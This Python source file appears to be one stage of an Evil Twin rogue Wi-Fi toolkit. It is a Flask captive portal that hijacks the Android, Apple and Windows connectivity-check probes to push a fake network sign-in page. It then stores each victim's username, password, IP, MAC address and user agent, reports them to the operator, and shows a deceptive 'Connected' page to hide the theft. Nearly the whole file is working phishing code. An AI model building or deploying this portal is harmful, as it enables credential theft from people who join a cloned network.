"""Stage 6 — Credential Capture (captive portal web server).

A small Flask application that pretends to be the sign-in page for the cloned network.
Because the Evil Twin's DNS answers every lookup with our own address and offers no real
internet, the victim's operating system runs its *captive-portal detection* probe, gets an
unexpected answer, and automatically surfaces this page.  Whatever the victim types is
persisted and announced to the operator in real time.

Captive-portal detection probes we deliberately "fail" so the login sheet pops:
  * Android  : /generate_204, /gen_204   (expects HTTP 204 → we serve the page instead)
  * Apple    : /hotspot-detect.html      (expects "Success" → we serve the page instead)
  * Windows  : /ncsi.txt, /connecttest.txt (expects fixed text → we serve the page instead)
A catch-all route serves the login page for any other path/host as well.
"""

from __future__ import annotations

import os
import threading
from typing import Callable, Optional

from flask import Flask, render_template, request

from core.state import STATE, Credential, Stage, StageStatus
from .credentials import CredentialStore

TEMPLATE_DIR = os.path.join(os.path.dirname(__file__), "templates")

# Page shown after the victim submits — looks like a normal "you're connected" screen.
_CONNECTED_HTML = """<!DOCTYPE html><html><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Connected</title>
<style>body{{font-family:-apple-system,Segoe UI,Roboto,Arial,sans-serif;background:#f1f3f4;
color:#202124;display:flex;min-height:100vh;align-items:center;justify-content:center}}
.box{{background:#fff;padding:32px;border-radius:12px;box-shadow:0 1px 3px rgba(0,0,0,.2);
text-align:center;max-width:360px}}h1{{font-weight:500}}p{{color:#5f6368}}</style></head>
<body><div class="box"><h1>&#10003; Connected</h1>
<p>You are now connected to {ssid}. You may close this page.</p></div></body></html>"""


def _default_mac_lookup(lease_file: str) -> Callable[[str], str]:
    """Build an ip→mac resolver backed by the dnsmasq lease file."""

    def lookup(ip: str) -> str:
        try:
            with open(lease_file) as fh:
                for line in fh:
                    parts = line.split()
                    if len(parts) >= 3 and parts[2] == ip:
                        return parts[1]
        except FileNotFoundError:
            pass
        return ""

    return lookup


class PortalServer:
    """Runs the credential-capturing captive portal in a background thread."""

    def __init__(
        self,
        ssid: str,
        host: str = "0.0.0.0",
        port: int = 80,
        mac_lookup: Optional[Callable[[str], str]] = None,
    ):
        self.ssid = ssid
        self.host = host
        self.port = port
        self.mac_lookup = mac_lookup or (lambda _ip: "")
        self.store = CredentialStore()

        self.app = Flask(__name__, template_folder=TEMPLATE_DIR)
        # Quiet Flask's own logging; the tool provides its own feedback.
        import logging

        logging.getLogger("werkzeug").setLevel(logging.ERROR)
        self._register_routes()

        self._server = None        # werkzeug server (for clean shutdown)
        self._thread: Optional[threading.Thread] = None

    # ------------------------------------------------------------------
    # Routes
    # ------------------------------------------------------------------

    def _login_page(self, error: str = ""):
        return render_template("login.html", ssid=self.ssid, error=error)

    def _register_routes(self) -> None:
        app = self.app

        @app.route("/login", methods=["POST"])
        def login():  # noqa: ANN202 (Flask view)
            username = (request.form.get("username") or "").strip()
            password = request.form.get("password") or ""
            ip = request.remote_addr or ""
            mac = ""
            try:
                mac = self.mac_lookup(ip)
            except Exception:
                pass
            ua = request.headers.get("User-Agent", "")

            if not username or not password:
                return self._login_page("Please enter both your username and password.")

            self.store.save(
                Credential(
                    username=username,
                    password=password,
                    client_ip=ip,
                    client_mac=mac,
                    user_agent=ua,
                )
            )
            return _CONNECTED_HTML.format(ssid=self.ssid)

        # Captive-portal detection probes + everything else → serve the login page.
        @app.route("/", defaults={"path": ""})
        @app.route("/<path:path>")
        def catch_all(path):  # noqa: ANN202
            STATE.log(f"Portal hit: {request.host}/{path} from {request.remote_addr}",
                      level="info")
            return self._login_page()

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------

    def start(self) -> bool:
        from werkzeug.serving import make_server

        try:
            self._server = make_server(self.host, self.port, self.app, threaded=True)
        except OSError as exc:
            STATE.log(f"Captive portal could not bind {self.host}:{self.port} ({exc})",
                      level="error")
            return False

        self._thread = threading.Thread(target=self._server.serve_forever, daemon=True)
        self._thread.start()
        STATE.portal_running = True
        STATE.set_stage(Stage.CREDENTIALS, StageStatus.RUNNING)
        STATE.log(f"Captive portal listening on {self.host}:{self.port} "
                  f"(SSID '{self.ssid}')", level="good")
        return True

    def stop(self) -> None:
        if self._server is not None:
            try:
                self._server.shutdown()
            except Exception:
                pass
            self._server = None
        STATE.portal_running = False
        STATE.log("Captive portal stopped.", level="info")

    @property
    def running(self) -> bool:
        return STATE.portal_running


# Re-exported so the orchestrator can build the lease-backed resolver without importing
# the rogue-AP module directly.
def lease_mac_lookup(lease_file: str) -> Callable[[str], str]:
    return _default_mac_lookup(lease_file)
